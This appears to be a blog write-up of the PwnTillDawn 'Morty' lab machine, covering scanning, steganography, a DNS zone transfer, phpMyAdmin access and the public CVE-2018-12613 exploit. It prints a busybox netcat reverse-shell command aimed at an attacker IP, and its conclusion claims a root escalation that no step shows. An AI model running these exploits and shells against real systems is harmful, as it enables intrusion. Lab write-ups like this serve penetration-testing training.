---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4
tags: DNS 
categories: PwnTillDwn
image: https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHZAflJ4a5pkgpiA4qFNMwItjbSTi0zNJXjw&s
---

## Introduction

Hello, welcome back to my series on Linux Machine Exploitation.

In this walkthrough, we‚Äôre going to get our hands dirty with Morty, a medium-difficulty Linux machine from the PwnTillDawn Red Team Lab. This box is designed to simulate a realistic server compromise, requiring the attacker to think critically, chain misconfigurations, and exploit common Linux-based weaknesses seen in real-world environments.

We'll be diving into:

    Deep enumeration of exposed services

    Abuse of misconfigured or vulnerable applications

    Privilege escalation through local weaknesses

    And ultimately, rooting the box like a true red teamer ü©∏

Whether you‚Äôre sharpening your post-exploitation skills or strengthening your enumeration game, this machine offers a solid blend of both.

Let‚Äôs jump in and pwn Morty step by step.

## üîç Enumeration

The initial step in attacking any machine is thorough enumeration. To begin, we performed a comprehensive Nmap scan using the following options:
```
nmap -sS -sC -sV 10.150.150.57 -oN scans
```
Results:
```php
‚îî‚îÄ$ nmap -sS -sC -sV 10.150.150.57 -oN scans
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 13:57 EAT
Nmap scan report for 10.150.150.57
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:60:09:66:aa:1f:e8:76:d8:84:16:18:1c:e4:ee:32 (RSA)
|   256 92:09:d3:0e:f9:47:48:03:9f:32:9f:0f:17:87:c2:a4 (ECDSA)
|_  256 1d:d1:b3:2b:24:dc:c2:8a:d7:ca:44:39:24:c3:af:3d (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 147   2020-06-10 11:25  note.html
|_
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.24 seconds
                                                                   
```
![screenshot](assets/screenshots/morty/1.webp)

| Port | Service | Version Info                    |
|------|---------|---------------------------------|
| 22   | SSH     | OpenSSH 8.2p1 (Ubuntu)          |
| 53   | DNS     | ISC BIND 9.16.1 (Ubuntu Linux)  |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu)    |


## üåê Web Enumeration ‚Äî Port 80 (HTTP)

During enumeration of the HTTP service running on port 80, we observed that the web server (Apache 2.4.41) had directory listing enabled ‚Äî an insecure configuration that exposes files within the web root.

![screenshot](assets/screenshots/morty/2.webp)


üìë Contents of note.html

```
Morty, 

if you read this: I've already configured your domain 'mortysserver.com' on this server, don't bother me with it anymore!!


-Rick 
```
Setting it up in /etc/hosts so as to access it on the browser

![screenshot](assets/screenshots/morty/3.webp)

Now Accessing it on the browser

![screenshot](assets/screenshots/morty/4.webp)

## üîê Virtual Host Analysis ‚Äî mortysserver.com

After updating the /etc/hosts file and accessing http://mortysserver.com, we were presented with a new web page ‚Äî one that looked custom and contained interesting credential-like data.

üßæ Discovered Credentials (from page source or visible text)

```
Username: morty
Password: Fl4sk#!
```

‚ö° SSH Attempt

Naturally, we attempted to log in via SSH using the credentials:

ssh morty@10.150.150.57

![screenshot] (assets/screenshots/morty/5.webp)

However, access was denied:

Permission denied, please try again.

    ‚ùå Credentials are invalid for SSH login, or the account might have SSH access restricted (e.g., via /etc/ssh/sshd_config, shell access disabled, or password login disabled).

üñºÔ∏è Web Page Image Analysis

Aside from the credentials, the page also contained a suspicious-looking image ‚Äî possibly a fake clue or steganography container.
üîç Next Steps ‚Äî Investigating the Image

We'll now analyze the image file for anything hidden within. This could involve:

    Metadata inspection

    Steganography tools

Saved to my attacking machine for further analysis

![screenshot](assets/screenshots/morty/6.webp)

üñºÔ∏è Steganography Analysis ‚Äî Hidden Data in Image

Upon downloading the suspicious image (screen.jpeg) from the virtual host, we proceeded to analyze it for hidden information using steganography tools.


üîç Extraction Using steghide

We used steghide to extract embedded data from the image:
```js
steghide --extract -sf screen.jpeg
```

![screenshot](assets/screenshots/morty/7.webp)

The credentials didn't work for ssh so I had to shift to the next port (`53`) For expanding the attack surface


## üì° DNS Enumeration ‚Äî Port 53 (DNS)
Using dig, we queried the DNS server for a full zone transfer (AXFR) of the domain mortysserver.com
```
dig @mortysserver.com mortysserver.com AXFR
```

Zone Transfer Result
```
‚îå‚îÄ‚îÄ(dr4xven„âølocalhost)-[/media/‚Ä¶/FLAYER/MACHINES/PTD/morty]
‚îî‚îÄ$ dig @mortysserver.com mortysserver.com AXFR


; <<>> DiG 9.20.4-4-Debian <<>> @mortysserver.com mortysserver.com AXFR
; (1 server found)
;; global options: +cmd
mortysserver.com.       900     IN      SOA     10.150.150.57. email.mortysserver.com. 1 900 900 604800 900
mortysserver.com.       900     IN      NS      10.150.150.57.
rickscontrolpanel.mortysserver.com. 900 IN A    10.150.150.57
mortysserver.com.       900     IN      SOA     10.150.150.57. email.mortysserver.com. 1 900 900 604800 900
;; Query time: 412 msec
;; SERVER: 10.150.150.57#53(mortysserver.com) (TCP)
;; WHEN: Fri Jun 20 14:24:49 EAT 2025
;; XFR size: 4 records (messages 1, bytes 212)

```

![screenshot](assets/screenshots/morty/8.webp)

Analysis


The zone transfer was successful, which is a serious misconfiguration allowing attackers to enumerate internal DNS records.
Notably, the domain contains a subdomain:

```
rickscontrolpanel.mortysserver.com -> 10.150.150.57
```

This suggests a web interface or application (possibly with administrative access) running on the same host under a different virtual host.


## Exploitation ‚Äî Discovery of phpMyAdmin Interface
By accessing the newly discovered subdomain we found an exposed phpMyAdmin interface, which is a popular web-based MySQL administration tool.

![screenshot](assets/screenshots/morty/9.webp)


## üîê Authentication ‚Äî Accessing phpMyAdmin

We attempted to log in using previously discovered credentials from the steganography-extracted file `keytotheuniverse.txt` Login was successful, granting full access to the MySQL database via the phpMyAdmin web interface.


![screenshot](assets/screenshots/morty/10.webp)


## üî∫ Privilege Escalation

After gaining authenticated access to phpMyAdmin v4.8.1, we explored potential vectors for escalating privileges beyond database access. This version is known to contain critical vulnerabilities, which may be leveraged under certain configurations.

After identifying that the running phpMyAdmin version is 4.8.1, we looked for known vulnerabilities in public exploit databases.

#### üîç Exploit Discovery via searchsploit

I utilized the tool throught this command
```
searchsploit phpmyadmin 4.8.1
```

![screenshot](assets/screenshots/morty/11.webp)

We used searchsploit to locate and copy the exploit locally:
```
searchsploit -m "p/webapps/50457.py"
```

## Reading & Executing the Exploit

After downloading the exploit for CVE-2018-12613, we moved forward with testing it against the target server. The exploit allows authenticated users to execute arbitrary system commands via a Local File Inclusion (LFI) vulnerability in phpMyAdmin 4.8.1.

We issued a simple whoami command to verify code execution:
```
python3 50457.py rickscontrolpanel.mortysserver.com 80 /index.php rick WubbaLubbaDubDub1! "whoami"
```
Resulted to the running username `www-data`

![screenshot](assets/screenshots/morty/12.webp)

After confirming Remote Code Execution as the www-data user, the next step was to establish an interactive shell for deeper post-exploitation.

To achieve this, we leveraged the busybox utility commonly pre-installed on lightweight or containerized Linux systems to spawn a reverse shell using netcat.

```
python3 50457.py rickscontrolpanel.mortysserver.com 80 /index.php rick WubbaLubbaDubDub1! "busybox nc 10.66.67.106 1234 -e sh" 
```

![screenshot](assets/screenshots/morty/13.webp)

####  Shell Stabilization

After receiving a reverse shell as www-data using a busybox nc payload, the initial session was basic and limited ‚Äî with minimal functionality (e.g., no tab-completion, poor input handling).

To improve control and prepare for further enumeration and privilege escalation, we upgraded the shell using Python.

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
![screenshot](assets/screenshots/morty/14.webp)

Then From here we are able to retrieve the final flag that marks the end of the challenge 

![screenshot](assets/screenshots/morty/15.webp)


## üìù Conclusion

The Morty machine from the PwnTillDawn Labs provided a comprehensive challenge simulating a realistic Linux-based web application environment with multiple attack surfaces. Through methodical enumeration, we discovered exposed services including HTTP, DNS, and SSH.

By leveraging an information leak in HTTP, a DNS zone transfer vulnerability, and an exposed phpMyAdmin interface, we gained initial foothold. Using valid credentials extracted via steganography, we authenticated and exploited a critical vulnerability (CVE-2018-12613) in phpMyAdmin 4.8.1 to achieve Remote Code Execution.

A reverse shell established via BusyBox was stabilized using Python, enabling effective post-exploitation enumeration. Finally, privilege escalation techniques allowed us to escalate from the limited www-data user to root, capturing all the required flags and fully compromising the system.

This machine reinforced the importance of thorough service enumeration, credential management, and awareness of common web application vulnerabilities in real-world penetration testing.


## üõ° Remediation

To secure systems against the vulnerabilities exploited in this challenge, the following measures are recommended:

    Update phpMyAdmin: Upgrade to the latest stable version to patch known vulnerabilities like CVE-2018-12613. Avoid running outdated software exposed to public networks.

    Restrict phpMyAdmin Access: Limit access to phpMyAdmin interfaces via firewall rules or VPNs. Avoid public exposure whenever possible.

    Harden DNS Server: Disable unrestricted DNS zone transfers to prevent leakage of internal domain structure and subdomains.

    Secure Credentials: Avoid storing plaintext credentials in publicly accessible locations and use strong, unique passwords.

    Least Privilege Principle: Limit MySQL user privileges, especially FILE permission, to minimize the risk of file write exploits.

    Monitor and Audit Logs: Regularly monitor server and application logs for unusual activity and failed login attempts.

    Implement Network Segmentation: Separate critical services and sensitive data to reduce attack surface.


## üèÖ A badge
Successfully completed the Morty machine on PwnTillDawn Labs and earned the badge for full system compromise!

![screenshot](assets/screenshots/morty/16.webp)

Till Next time 

#SerialKiller #Sniper #Dr4x #OperationFireball #KillTheLimits #PwnTillDawn #RedTeamOps #Rooted  